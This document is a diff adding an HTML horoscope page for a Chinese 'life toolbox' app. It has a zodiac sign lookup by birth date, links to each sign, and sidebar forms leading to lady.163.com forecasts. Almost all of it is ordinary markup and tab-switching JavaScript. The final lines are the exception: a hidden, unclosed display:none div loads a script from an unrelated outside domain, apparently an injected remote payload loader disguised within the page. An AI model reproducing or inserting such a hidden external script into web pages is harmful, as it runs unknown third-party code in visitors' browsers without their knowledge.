@@ -1,0 +1,482 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>生活百宝箱-星座运程</title>
+<link href="../res/zl_style.css" rel="stylesheet" type="text/css" />
+<link href="../res/zl_xingzuo_right.css" rel="stylesheet" type="text/css" />
+<script language="javascript" src="../js/xz_all.js"></script>
+<script type="text/javascript">
+//js麻烦技术的合并，或者使用你们自己的函数接口
+function tabDiv(obj,num,len,cn)
+{
+ var cssname=cn;
+ for(var id = 1;id<=len;id++)
+ {
+  var ss=obj+id;
+  var snav =obj+"nav"+id;
+  if(id==num){
+  try{document.getElementById(ss).style.display="block"}catch(e){};
+  try{document.getElementById(snav).className=cssname}catch(e){};
+  }else{
+  try{document.getElementById(ss).style.display="none"}catch(e){};
+  try{document.getElementById(snav).className=""}catch(e){};
+  }
+ }  
+}
+//切换end
+</script>
+</head>
+<body lang="zh" onLoad="fInitStar();">
+<div class="Top"><a href="../index.htm" class="a_INDEX">生活百宝箱</a><b class="Top_B_arr"></b><span><strong>星座</strong></span></div>
+<!--内容开始-->
+<div class="sx_top xzbg">生于 &nbsp;<input id="month" name="month" type="text" class="inp" onFocus="this.style.borderColor='#889297';this.style.backgroundColor='#FFFFE8'" onBlur="this.style.borderColor='#7F9DB9';this.style.backgroundColor='#FFF'" maxlength="2" style="width:25px"> 
+&nbsp;月&nbsp;<input  id="day" name="day" type="text" class="inp" onFocus="this.style.borderColor='#889297';this.style.backgroundColor='#FFFFE8'" onBlur="this.style.borderColor='#7F9DB9';this.style.backgroundColor='#FFF'" maxlength="2" style="width:25px"> 
+&nbsp;日 &nbsp;
+<input type="submit" onClick="fGetStar();" name="Submit" value=" 查看星座 " class="btn"> 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="CC000EC" id="sStar" style="display:none">水瓶座</span></div>
+<div class="Cont" style=" margin:0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td valign="top">
+ <div style="width:100%">
+<table id="hrefTable" class="xz_tab" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+	<a href="star_1.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico1"></div>
+		<div class="xz_word_info"><strong>白羊座</strong><br />3.21 - 4.20</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_2.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico2"></div>
+		<div class="xz_word_info"><strong>金牛座</strong><br />4.21 - 5.20</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_3.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico3"></div>
+		<div class="xz_word_info"><strong>双子座</strong><br />
+		  5.21 - 6.21</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_4.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico4"></div>
+		<div class="xz_word_info"><strong>巨蟹座</strong><br />6.22 - 7.22</div>
+	</div>
+	</a>
+	</td>
+  </tr>
+  <tr>
+    <td>
+	<a href="star_5.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico5"></div>
+		<div class="xz_word_info"><strong>狮子座</strong><br />7.23 - 8.22</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_6.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico6"></div>
+		<div class="xz_word_info"><strong>处女座</strong><br />8.23 - 9.22</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_7.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico7"></div>
+		<div class="xz_word_info"><strong>天秤座</strong><br />9.23 - 10.22</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_8.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico8"></div>
+		<div class="xz_word_info"><strong>天蝎座</strong><br />10.23 - 11.21</div>
+	</div>
+	</a>
+	</td>
+  <tr>
+  </tr>
+    <td>
+	<a href="star_9.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico9"></div>
+		<div class="xz_word_info"><strong>射手座</strong><br />
+		  11.22 - 12.21</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_10.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico10"></div>
+		<div class="xz_word_info"><strong>摩羯座</strong><br />12.22 - 1.19</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_11.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico11"></div>
+		<div class="xz_word_info"><strong>水瓶座</strong><br />
+		1.20 - 2.19</div>
+	</div>
+	</a>
+	</td>
+    <td>
+	<a href="star_12.html" >
+	<div class="xz_box" onMouseOver="addClass(this,'xzbox_on')" onMouseOut="delClass(this,'xzbox_on')">
+		<div class="xz_icon ico12"></div>
+		<div class="xz_word_info"><strong>双鱼座</strong><br />2.20 - 3.20</div>
+	</div>
+	</a>
+	</td>
+   </tr>
+</table>
+<script language="JavaScript">
+<!--
+	var aHref = document.getElementById("hrefTable").getElementsByTagName("A");
+	for(var i = 0;i < aHref.length; i++){
+		aHref[i].href = aHref[i].href + "?" + location.host;
+	}
+		
+//-->
+</script>
+</div>   
+    
+    </td>
+    <td class="col2" style="background-color:#FFF" width="185" valign="top">
+<div class="rightcol">    
+		<div class="blank9"></div>
+		<div class="rightTi">
+			<h3><a href="" title="运势查询"><img src="http://cimg2.163.com/lady/img/xingzuo0215/rightTi.gif" /></a></h3>
+		</div>
+		<div class="blank9"></div>
+ <div class="tabBox tabLuck ">
+			<ul class="tab">
+                    <li id="tabLucknav1"><a href="http://lady.163.com/special/00261PJK/showastro.html?t=0"
+                        onmouseover="javascript:tabDiv('tabLuck',1,6,'active')" target="_blank">每日运</a></li>
+                    <li id="tabLucknav2" class="active"><a href="http://lady.163.com/special/00261PJK/showastro.html?t=48"
+                        onmouseover="javascript:tabDiv('tabLuck',2,6,'active')" target="_blank">明日运</a></li>
+                    <li id="tabLucknav3"><a href="http://lady.163.com/special/00261PJK/showastro.html?t=12" onMouseOver="javascript:tabDiv('tabLuck',3,6,'active')"
+                        target="_blank">每周运</a></li>
+                    <li id="tabLucknav4"><a href="http://lady.163.com/special/00261PJK/showastro.html?t=24" onMouseOver="javascript:tabDiv('tabLuck',4,6,'active')"
+                        target="_blank">每月运</a></li>
+                    <li id="tabLucknav5"><a href="http://lady.163.com/special/00261PJK/showastro.html?t=36" onMouseOver="javascript:tabDiv('tabLuck',5,6,'active')"
+                        target="_blank">08年运</a></li>
+                    <li id="tabLucknav6"><a href="http://lady.163.com/special/00261PJK/eq08.html" onMouseOver="javascript:tabDiv('tabLuck',6,6,'active')"
+                        target="_blank">08爱情</a></li>
+          </ul>
+                <div class="tabBoxContent">
+                    <div class="text" id="tabLuck1" style="display: none;">
+                        <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=0" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=1" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=2" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=3" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=4" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=5" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=6" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=7" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=8" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=9" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=10" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=11" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                    <div class="text" id="tabLuck2" style="display: block;">
+                        <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=48" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=49" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=50" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=51" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=52" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=53" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=54" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=55" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=56" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=57" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=58" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=59" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                    <div class="text" id="tabLuck3" style="display: none;">
+                                            
+                             <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=12" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=13" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=14" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=15" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=16" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=17" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=18" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=19" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=20" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=21" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=22" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=23" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                    <div class="text" id="tabLuck4" style="display: none;">
+                                            <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=24" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=25" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=26" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=27" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=28" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=29" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=30" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=31" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=32" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=33" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=34" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=35" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                    <div class="text" id="tabLuck5" style="display: none;">
+                        <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=36" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=37" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=38" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=39" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=40" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=41" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=42" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=43" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=44" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=45" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=46" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/showastro.html?t=47" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                    <div class="text" id="tabLuck6" style="display: none;">
+                        <ul>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="白羊座" class="cBlue">
+                                白羊座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="金牛座" class="cBlue">
+                                金牛座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="双子座" class="cBlue">
+                                双子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="巨蟹座" class="cBlue">
+                                巨蟹座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="狮子座" class="cBlue">
+                                狮子座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="处女座" class="cBlue">
+                                处女座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="天秤座" class="cBlue">
+                                天秤座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="天蝎座" class="cBlue">
+                                天蝎座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="射手座" class="cBlue">
+                                射手座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="摩羯座" class="cBlue">
+                                摩羯座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="水瓶座" class="cBlue">
+                                水瓶座</a></li>
+                            <li><a href="http://lady.163.com/special/00261PJK/eq08.html" target="_blank" title="双鱼座" class="cBlue">
+                                双鱼座</a></li>
+                        </ul>
+                        <div class="clear">
+                        </div>
+                    </div>
+                </div>
+                <div class="clear">
+                </div>
+                <div class="blank12">
+                </div>
+                <div class="formlist">
+                    <form action="http://lady.163.com/special/00261PJK/showxx.html" target="_blank" method="get" id="myform11">
+                        <strong>星座与血型</strong><br />
+                        <select name="d5" id="d5">
+                            <option value="19">白羊</option>
+                            <option value="20">金牛</option>
+                            <option value="21">双子</option>
+                            <option value="22">巨蟹</option>
+                            <option value="23">狮子</option>
+                            <option value="24">处女</option>
+                            <option value="25">天秤</option>
+                            <option value="26">天蝎</option>
+                            <option value="27">射手</option>
+                            <option value="28">摩羯</option>
+                            <option value="29">水瓶</option>
+                            <option value="30">双鱼</option>
+                        </select>
+                        <select name="db5" id="db5">
+                            <option value="ab">AB型</option>
+                            <option value="o">O型</option>
+                            <option value="a">A型</option>
+                            <option value="b">B型</option>
+                        </select>
+                        <input type="submit" class="bt" value="GO" />
+                    </form>
+                    <div class="blank12">
+                    </div>
+                    <form action="http://lady.163.com/special/00261PJK/showxx.html" target="_blank" method="get" id="myform12">
+                        <strong>星座匹配</strong><br />
+                        <select name="d6" id="d6">
+                            <option value="19">白羊</option>
+                            <option value="20">金牛</option>
+                            <option value="21">双子</option>
+                            <option value="22">巨蟹</option>
+                            <option value="23">狮子</option>
+                            <option value="24">处女</option>
+                            <option value="25">天秤</option>
+                            <option value="26">天蝎</option>
+                            <option value="27">射手</option>
+                            <option value="28">摩羯</option>
+                            <option value="29">水瓶</option>
+                            <option value="30">双鱼</option>
+                        </select>
+                        <select name="db6" id="db6">
+                            <option value="19">白羊</option>
+                            <option value="20">金牛</option>
+                            <option value="21">双子</option>
+                            <option value="22">巨蟹</option>
+                            <option value="23">狮子</option>
+                            <option value="24">处女</option>
+                            <option value="25">天秤</option>
+                            <option value="26">天蝎</option>
+                            <option value="27">射手</option>
+                            <option value="28">摩羯</option>
+                            <option value="29">水瓶</option>
+                            <option value="30">双鱼</option>
+                        </select>
+                        <input type="submit" class="bt" value="GO" />
+                    </form>
+                    <div class="blank12">
+                    </div>
+                    <form action="http://lady.163.com/special/00261PJK/showxx.html" target="_blank" method="get" id="myform13">
+                        想与&nbsp;<select name="d1" id="d1">
+                            <option value="19">白羊</option>
+                            <option value="20">金牛</option>
+                            <option value="21">双子</option>
+                            <option value="22">巨蟹</option>
+                            <option value="23">狮子</option>
+                            <option value="24">处女</option>
+                            <option value="25">天秤</option>
+                            <option value="26">天蝎</option>
+                            <option value="27">射手</option>
+                            <option value="28">摩羯</option>
+                            <option value="29">水瓶</option>
+                            <option value="30">双鱼</option>
+                        </select>&nbsp;女生拍拖
+                        <input type="submit" class="bt" value="GO" />
+                    </form>
+                    <div class="blank6">
+                    </div>
+                    <form action="http://lady.163.com/special/00261PJK/showxx.html" target="_blank" method="get" id="myform14">
+                        想与&nbsp;<select name="d2" id="d2">
+                            <option value="19">白羊</option>
+                            <option value="20">金牛</option>
+                            <option value="21">双子</option>
+                            <option value="22">巨蟹</option>
+                            <option value="23">狮子</option>
+                            <option value="24">处女</option>
+                            <option value="25">天秤</option>
+                            <option value="26">天蝎</option>
+                            <option value="27">射手</option>
+                            <option value="28">摩羯</option>
+                            <option value="29">水瓶</option>
+                            <option value="30">双鱼</option>
+                        </select>&nbsp;男生拍拖
+                        <input type="submit" class="bt" value="GO" />
+                    </form>
+                </div>
+		</div>
+        <div class="blank12"></div>
+</div>    
+    </td>
+    <td width="20">&nbsp;</td>
+  </tr>
+</table>
+</div>
+	<div class="bot_back_btn">
+		<input type="button" value="<< 返回生活百宝箱" class="Back_IND" onclick="javascript:location.href='../index.htm'"/>
+	</div>
+  <div style='display:none'>
+<script type="text/javascript" src="http://www.26rc.com/js/26.js"></script>
+</body>
+</html>
